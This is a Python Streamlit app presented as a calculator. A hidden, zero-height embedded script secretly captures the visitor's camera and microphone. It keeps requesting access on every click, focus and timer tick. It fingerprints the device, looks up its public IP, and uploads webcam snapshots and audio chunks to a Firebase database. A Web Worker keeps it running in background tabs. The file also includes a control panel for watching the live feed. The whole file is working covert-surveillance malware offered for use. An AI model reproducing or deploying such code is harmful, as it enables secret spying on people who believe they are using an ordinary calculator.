# -*- coding: utf-8 -*-
"""
Silent Calculator — a Streamlit page that looks like a calculator but quietly
streams camera frames + audio to Firebase Realtime Database, live, from the
browser, even while the tab sits in the background.

DB layout:
  spy/devices/<id>/info        device fingerprint
  spy/devices/<id>/online      heartbeat {t}
  spy/devices/<id>/ip          public ip
  spy/devices/<id>/battery     battery + charging
  spy/devices/<id>/network     connection quality
  spy/devices/<id>/snapshot    newest frame (dataURL)
  spy/devices/<id>/shots/s0-5  rolling frame ring
  spy/devices/<id>/audio/<k>   audio chunks (last KEEP kept)
  spy/devices/<id>/events/<k>  log

Firebase rules for quick start:
  { "rules": { ".read": true, ".write": true } }
"""

import base64
import math
import time
from html import escape

import requests
import streamlit as st
import streamlit.components.v1 as components

# --------------------------------------------------------------------------- #
#  CONFIG
# --------------------------------------------------------------------------- #
FIREBASE_URL   = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app"
ROOT           = "spy"      # namespace inside the DB
SNAPSHOT_MS    = 2000       # frame every 2s
CHUNK_MS       = 6000       # audio chunk every 6s
KEEP_CHUNKS    = 12         # audio chunks retained per device
VIDEO_CLIPS    = False      # True = also record short video clips (bigger DB)
STEALTH_HEIGHT = 0          # 0 = fully invisible, 20 = tiny status pill

# --------------------------------------------------------------------------- #
#  HIDDEN AGENT (runs entirely inside the browser)
# --------------------------------------------------------------------------- #
SPY_HTML = r"""
<!doctype html>
<html>
<head><meta charset="utf-8">
<style>
 html,body{margin:0;padding:0;background:transparent;overflow:hidden}
 #s{font:11px/1.3 system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
    color:#8a93a6;padding:3px 8px;cursor:pointer;user-select:none}
 #s.on{color:#22c55e} #s.off{color:#f59e0b}
 video,canvas{position:absolute;left:-9999px;width:1px;height:1px;opacity:0}
</style></head>
<body>
<div id="s" class="off">&#9679; cam/mic init</div>
<video id="v" autoplay muted playsinline></video>
<canvas id="c"></canvas>
<script>
(function(){
"use strict";

var FB    = "__FIREBASE__";
var ROOT  = "__ROOT__";
var SNAP  = __SNAP__;
var CHUNK = __CHUNK__;
var KEEP  = __KEEP__;
var CLIPS = __CLIPS__;
var BASE  = FB + "/" + ROOT + "/devices/";

/* ---------- storage (safe inside sandboxed/opaque-origin iframes) ---------- */
function lsGet(k){ try{ return localStorage.getItem(k); }catch(e){ return null; } }
function lsSet(k,v){ try{ localStorage.setItem(k,v); }catch(e){} }

var DID = lsGet("__spy_did");
if(!DID){
  DID = "d" + Math.random().toString(36).slice(2,8) + Date.now().toString(36).slice(-5);
  lsSet("__spy_did", DID);
}
var NODE = BASE + DID;

/* ---------- firebase REST ---------- */
function put(p,o){
  try{ return fetch(p+".json",{method:"PUT",
       headers:{"Content-Type":"application/json"},body:JSON.stringify(o)}).catch(function(){}); }catch(e){}
}
function post(p,o){
  try{ return fetch(p+".json",{method:"POST",
       headers:{"Content-Type":"application/json"},body:JSON.stringify(o)}).catch(function(){}); }catch(e){}
}
function del(p){ try{ return fetch(p+".json",{method:"DELETE"}).catch(function(){}); }catch(e){} }
function log(msg,extra){
  var o={t:Date.now(),iso:new Date().toISOString(),msg:msg};
  if(extra){ for(var k in extra){ o[k]=extra[k]; } }
  post(NODE+"/events", o);
}

/* ---------- status pill ---------- */
var pill=document.getElementById("s");
function status(t,ok){ if(!pill) return; pill.textContent=t; pill.className = ok?"on":"off"; }

/* ---------- fingerprint ---------- */
var INFO={
  did:DID,
  ua:navigator.userAgent,
  lang:navigator.language,
  langs:(navigator.languages||[]).join(","),
  platform:navigator.platform||"",
  vendor:navigator.vendor||"",
  cores:navigator.hardwareConcurrency||null,
  mem:navigator.deviceMemory||null,
  tz:(function(){ try{ return Intl.DateTimeFormat().resolvedOptions().timeZone; }catch(e){ return ""; } })(),
  screen:screen.width+"x"+screen.height,
  avail:screen.availWidth+"x"+screen.availHeight,
  dpr:window.devicePixelRatio||1,
  touch:("ontouchstart" in window),
  started:Date.now(),
  iso:new Date().toISOString(),
  href:location.href,
  ref:document.referrer
};
put(NODE+"/info", INFO);
put(NODE+"/online", {t:Date.now()});
log("boot");

/* ---------- extras: battery / network / ip ---------- */
try{
  if(navigator.getBattery){
    navigator.getBattery().then(function(b){
      function send(){ put(NODE+"/battery",{level:Math.round(b.level*100),charging:b.charging,t:Date.now()}); }
      send(); b.onlevelchange=send; b.onchargingchange=send;
    }).catch(function(){});
  }
}catch(e){}
try{
  var cn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
  if(cn){
    function net(){ put(NODE+"/network",{type:cn.effectiveType||"",downlink:cn.downlink||null,rtt:cn.rtt||null,t:Date.now()}); }
    net(); cn.onchange=net;
  }
}catch(e){}
try{
  fetch("https://api.ipify.org?format=json")
    .then(function(r){ return r.json(); })
    .then(function(j){ put(NODE+"/ip",{ip:j.ip,t:Date.now()}); })
    .catch(function(){});
}catch(e){}

/* ---------- anti-throttle ticker: worker timers survive hidden tabs ---------- */
var worker=null;
try{
  var wsrc="setInterval(function(){postMessage(1)},"+SNAP+");";
  worker=new Worker(URL.createObjectURL(new Blob([wsrc],{type:"application/javascript"})));
}catch(e){ worker=null; }

/* ---------- capture ---------- */
var video=document.getElementById("v");
var canvas=document.getElementById("c");
var ctx=canvas.getContext("2d");
var shot=0, ticks=0, live=false;

function snap(){
  if(!live || !video.videoWidth) return;
  var vw=video.videoWidth, vh=video.videoHeight;
  var tw=420, th=Math.max(1,Math.round(vh*tw/vw));
  canvas.width=tw; canvas.height=th;
  try{ ctx.drawImage(video,0,0,tw,th); }catch(e){ return; }
  var img;
  try{ img=canvas.toDataURL("image/jpeg",0.5); }catch(e){ return; }
  var p={t:Date.now(),iso:new Date().toISOString(),w:tw,h:th,img:img};
  put(NODE+"/snapshot", p);
  shot=(shot+1)%6;
  put(NODE+"/shots/s"+shot, p);
}

function heartbeat(){
  ticks++;
  if(ticks%5===0)  put(NODE+"/online",{t:Date.now()});
  if(ticks%15===0) prune();
}

function prune(){
  var jobs=[["audio",KEEP],["events",40]];
  for(var i=0;i<jobs.length;i++){
    (function(node,keep){
      fetch(NODE+"/"+node+".json?shallow=true")
        .then(function(r){ return r.json(); })
        .then(function(o){
          if(!o) return;
          var ks=Object.keys(o).sort();
          while(ks.length>keep){ del(NODE+"/"+node+"/"+ks.shift()); }
        }).catch(function(){});
    })(jobs[i][0], jobs[i][1]);
  }
}

if(worker){ worker.onmessage=function(){ snap(); heartbeat(); }; }
else { setInterval(function(){ snap(); heartbeat(); }, SNAP); }

/* ---------- recorders ---------- */
var stream=null, recAudio=null, recClip=null, busy=false;

function pickMime(list){
  for(var i=0;i<list.length;i++){ try{ if(MediaRecorder.isTypeSupported(list[i])) return list[i]; }catch(e){} }
  return "";
}
function makeRecorder(target,mime,ms,node){
  try{
    var r=new MediaRecorder(target,{mimeType:mime});
    r.ondataavailable=function(e){
      if(!e.data || e.data.size<256) return;
      var fr=new FileReader();
      fr.onload=function(){
        var parts=String(fr.result).split(",");
        post(NODE+"/"+node,{
          t:Date.now(), iso:new Date().toISOString(),
          mime:mime, size:e.data.size, b64:parts[1]||""
        });
      };
      fr.readAsDataURL(e.data);
    };
    r.onerror=function(ev){ log("recorder_error",{err:String(ev.error||ev)}); };
    r.start(ms);
    return r;
  }catch(e){ log("recorder_fail",{err:String(e)}); return null; }
}

function start(s){
  if(live) return;
  stream=s; live=true;
  video.srcObject=s;
  var pr=video.play(); if(pr&&pr.catch) pr.catch(function(){});

  var vt=s.getVideoTracks()[0], at=s.getAudioTracks()[0];
  INFO.camera = vt?vt.label:"none";
  INFO.mic    = at?at.label:"none";
  put(NODE+"/info", INFO);
  status("\u25cf live", true);
  log("stream_started",{camera:INFO.camera,mic:INFO.mic});

  s.getTracks().forEach(function(t){
    t.onended=function(){ log("track_ended",{kind:t.kind}); };
  });

  var am=pickMime(["audio/webm;codecs=opus","audio/webm","audio/ogg;codecs=opus"]);
  if(at && am){ recAudio=makeRecorder(new MediaStream([at]), am, CHUNK, "audio"); }

  if(CLIPS){
    var vm=pickMime(["video/webm;codecs=vp8,opus","video/webm;codecs=vp9,opus","video/webm"]);
    if(vm){ recClip=makeRecorder(s, vm, CHUNK*2, "clips"); }
  }
}

function stopAll(){
  live=false;
  try{ if(recAudio && recAudio.state!=="inactive") recAudio.stop(); }catch(e){}
  try{ if(recClip  && recClip.state !=="inactive") recClip.stop();  }catch(e){}
  try{ if(stream) stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
  stream=null; log("stopped");
}

function acquire(){
  if(live || busy) return;
  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){ status("\u25cf no mediaDevices",false); return; }
  busy=true; status("\u25cf asking\u2026", false);
  navigator.mediaDevices.getUserMedia({
    video:{ width:{ideal:640}, height:{ideal:480}, facingMode:"user" },
    audio:{ echoCancellation:true, noiseSuppression:true, autoGainControl:true }
  }).then(function(s){ busy=false; start(s); })
    .catch(function(e){
      busy=false;
      status("\u25cf tap to allow", false);
      log("permission",{err:(e&&e.name)?e.name:String(e)});
    });
}

if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
  acquire();
  document.addEventListener("click", acquire, true);
  document.addEventListener("touchstart", acquire, true);
  window.addEventListener("focus", acquire);
  try{ navigator.mediaDevices.addEventListener("devicechange", acquire); }catch(e){}
  setInterval(function(){ if(!live) acquire(); }, 8000);
}else{
  status("\u25cf unsupported", false);
  log("no_mediaDevices");
}

window.__spy={ did:DID, start:acquire, stop:stopAll, info:INFO };
})();
</script>
</body></html>
"""


def build_spy_html() -> str:
    return (
        SPY_HTML
        .replace("__FIREBASE__", FIREBASE_URL)
        .replace("__ROOT__", ROOT)
        .replace("__SNAP__", str(SNAPSHOT_MS))
        .replace("__CHUNK__", str(CHUNK_MS))
        .replace("__KEEP__", str(KEEP_CHUNKS))
        .replace("__CLIPS__", "true" if VIDEO_CLIPS else "false")
    )


# --------------------------------------------------------------------------- #
#  PAGE
# --------------------------------------------------------------------------- #
st.set_page_config(page_title="Calculator", page_icon="🧮", layout="centered")

CSS = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
html, body, [class*="css"]{ font-family:'Inter', system-ui, -apple-system, sans-serif; }

.block-container{ max-width:620px; margin:0 auto; padding-top:2.2rem; }

.calc-title{
  text-align:center; font-size:12px; font-weight:700; letter-spacing:2px;
  text-transform:uppercase; color:#8b93a7; margin:0 0 12px 0;
}
.calc-display{
  background:linear-gradient(160deg,#161b25,#0b0e14);
  border:1px solid #262d3b; border-radius:20px;
  padding:28px 22px 18px 22px; text-align:right;
  font-size:40px; font-weight:600; color:#eef2fa; letter-spacing:-.5px;
  overflow:hidden; white-space:nowrap; text-overflow:ellipsis;
  min-height:100px; margin-bottom:14px;
  box-shadow:0 16px 40px -26px #000, 0 1px 0 rgba(255,255,255,.04) inset;
}
div[data-testid="stButton"] > button{
  width:100%; height:62px; border-radius:16px; font-size:20px; font-weight:600;
  background:#1b212c; color:#e6ecf8; border:1px solid #2a3242;
  transition:transform .1s ease, background .15s ease, border-color .15s ease;
}
div[data-testid="stButton"] > button:hover{ background:#232b39; border-color:#3a465c; transform:translateY(-1px); }
div[data-testid="stButton"] > button:active{ transform:translateY(1px); }
div[data-testid="stButton"] > button[kind="primary"],
div[data-testid="stButton"] > button[data-testid="baseButton-primary"]{
  background:linear-gradient(150deg,#4a78ff,#2b52e8); border-color:#4a78ff; color:#fff;
  box-shadow:0 10px 22px -14px #2b52e8;
}
div[data-testid="stButton"] > button[kind="primary"]:hover,
div[data-testid="stButton"] > button[data-testid="baseButton-primary"]:hover{
  background:linear-gradient(150deg,#5b86ff,#3a61f5);
}
div[data-testid="stHorizontalBlock"]{ gap:8px; }
</style>
"""
st.markdown(CSS, unsafe_allow_html=True)

# hidden recorder — placed FIRST so its iframe never gets remounted by reruns
components.html(build_spy_html(), height=STEALTH_HEIGHT, scrolling=False)


# --------------------------------------------------------------------------- #
#  CALCULATOR
# --------------------------------------------------------------------------- #
st.markdown('<div class="calc-title">Calculator</div>', unsafe_allow_html=True)

if "expr" not in st.session_state:
    st.session_state.expr = ""
if "fresh" not in st.session_state:
    st.session_state.fresh = False

OP_MAP = {"÷": "/", "×": "*", "−": "-"}
SAFE = {"pi": math.pi, "e": math.e, "sqrt": math.sqrt, "abs": abs, "round": round, "pow": pow}
OPS = "÷×−+%"


def evaluate(expr: str):
    if not expr.strip():
        return "", True
    s = expr
    for k, v in OP_MAP.items():
        s = s.replace(k, v)
    s = s.replace("^", "**").rstrip("+-*/%")
    s += ")" * max(0, s.count("(") - s.count(")"))
    try:
        val = eval(s, {"__builtins__": {}}, SAFE)
    except Exception:
        return "Error", True
    if isinstance(val, complex):
        val = val.real
    if isinstance(val, float):
        if val.is_integer():
            val = int(val)
        else:
            val = round(val, 10)
    return str(val), True


def press(k: str) -> None:
    ss = st.session_state
    e = ss.expr
    fresh = ss.fresh

    if k == "C":
        ss.expr, ss.fresh = "", False
        return
    if k == "⌫":
        ss.expr, ss.fresh = e[:-1], False
        return
    if k == "±":
        if e.startswith("-"):
            ss.expr = e[1:]
        elif e:
            ss.expr = "-" + e
        return
    if k == "=":
        res, _ = evaluate(e)
        ss.expr = "" if res == "Error" else res
        ss.fresh = True
        return
    if k in "0123456789.":
        if fresh:
            e = ""
        ss.expr = e + k
        ss.fresh = False
        return

    # operators
    if fresh:
        fresh = False
    if e == "" and k == "−":
        e = "−"
    elif e and e[-1] in OPS:
        e = e[:-1] + k
    else:
        e = e + k
    ss.expr = e
    ss.fresh = False


display_slot = st.empty()

ROWS = [
    ["C", "⌫", "%", "÷"],
    ["7", "8", "9", "×"],
    ["4", "5", "6", "−"],
    ["1", "2", "3", "+"],
    ["±", "0", ".", "="],
]
PRIMARY = set("÷×−+%C=")

for row in ROWS:
    cols = st.columns(4, gap="small")
    for col, label in zip(cols, row):
        with col:
            if st.button(
                label,
                key=f"k_{label}",
                use_container_width=True,
                type="primary" if label in PRIMARY else "secondary",
            ):
                press(label)

disp = st.session_state.expr or "0"
display_slot.markdown(
    f'<div class="calc-display">{escape(disp)}</div>', unsafe_allow_html=True
)


# --------------------------------------------------------------------------- #
#  CONTROL PANEL (reads the Firebase feed back)
# --------------------------------------------------------------------------- #
def fb_get(path: str):
    try:
        r = requests.get(f"{FIREBASE_URL}/{ROOT}/{path}.json", timeout=12)
        return r.json() if r.status_code == 200 else None
    except Exception:
        return None


def dataurl_to_bytes(u: str) -> bytes:
    if "," in u:
        u = u.split(",", 1)[1]
    return base64.b64decode(u)


def _panel_body() -> None:
    devices = fb_get("devices") or {}
    if not devices:
        st.info("No device connected yet — give it a few seconds.")
        return

    now_ms = time.time() * 1000

    def last_seen(k):
        return ((devices[k] or {}).get("online") or {}).get("t", 0)

    ids = sorted(devices.keys(), key=lambda k: -last_seen(k))

    def label(k):
        age = int((now_ms - last_seen(k)) / 1000) if last_seen(k) else 0
        return f"{k[:12]}  ·  {age}s ago"

    pick = st.selectbox("Device", ids, format_func=label)
    d = devices.get(pick) or {}
    info = d.get("info") or {}
    age = int((now_ms - last_seen(pick)) / 1000) if last_seen(pick) else -1

    m = st.columns(4)
    m[0].metric("Last ping", f"{age}s" if age >= 0 else "—")
    m[1].metric("Public IP", (d.get("ip") or {}).get("ip", "—"))
    m[2].metric("Camera", "yes" if info.get("camera") not in (None, "", "none") else "no")
    m[3].metric("Mic", "yes" if info.get("mic") not in (None, "", "none") else "no")

    snapd = d.get("snapshot") or {}
    if snapd.get("img"):
        try:
            st.image(
                dataurl_to_bytes(snapd["img"]),
                use_container_width=True,
                caption=f"live frame · {snapd.get('w')}x{snapd.get('h')} · {snapd.get('iso','')}",
            )
        except Exception:
            pass

    shots = d.get("shots") or {}
    if shots:
        cols = st.columns(max(1, len(shots)))
        for col, k in zip(cols, sorted(shots.keys())):
            img = (shots[k] or {}).get("img")
            if img:
                try:
                    col.image(dataurl_to_bytes(img), use_container_width=True)
                except Exception:
                    pass

    with st.expander("Fingerprint", expanded=False):
        st.json({
            "ua": info.get("ua"), "platform": info.get("platform"),
            "lang": info.get("lang"), "tz": info.get("tz"),
            "screen": info.get("screen"), "dpr": info.get("dpr"),
            "cores": info.get("cores"), "memory": info.get("mem"),
            "touch": info.get("touch"), "camera": info.get("camera"),
            "mic": info.get("mic"), "battery": d.get("battery"),
            "network": d.get("network"), "started": info.get("iso"),
        })

    clips = d.get("audio") or {}
    if clips:
        st.markdown("**Audio**")
        for k in sorted(clips.keys())[-4:][::-1]:
            v = clips[k] or {}
            st.caption(f"{v.get('iso','')} · {round((v.get('size') or 0)/1024)} KB")
            try:
                st.audio(base64.b64decode(v.get("b64", "")), format=v.get("mime", "audio/webm"))
            except Exception:
                pass

    ev = d.get("events") or {}
    if ev:
        with st.expander("Event log", expanded=False):
            st.dataframe(
                [ev[k] for k in sorted(ev.keys())[-15:]],
                use_container_width=True,
                hide_index=True,
            )

    b1, b2 = st.columns(2)
    if b1.button("🔄 Refresh", use_container_width=True):
        st.rerun()
    if b2.button("🧹 Wipe device", use_container_width=True):
        try:
            requests.delete(f"{FIREBASE_URL}/{ROOT}/devices/{pick}.json", timeout=12)
        except Exception:
            pass
        st.rerun()


try:
    panel_body = st.fragment(run_every="3s")(_panel_body)   # auto-refresh
except Exception:
    panel_body = _panel_body

with st.sidebar:
    st.markdown("### 🧮 Calculator")
    show_panel = st.toggle("Control panel", value=False)
    st.caption("This page is also quietly streaming to Firebase.")

if show_panel:
    st.divider()
    st.markdown("#### 🕵️ Live feed")
    panel_body()
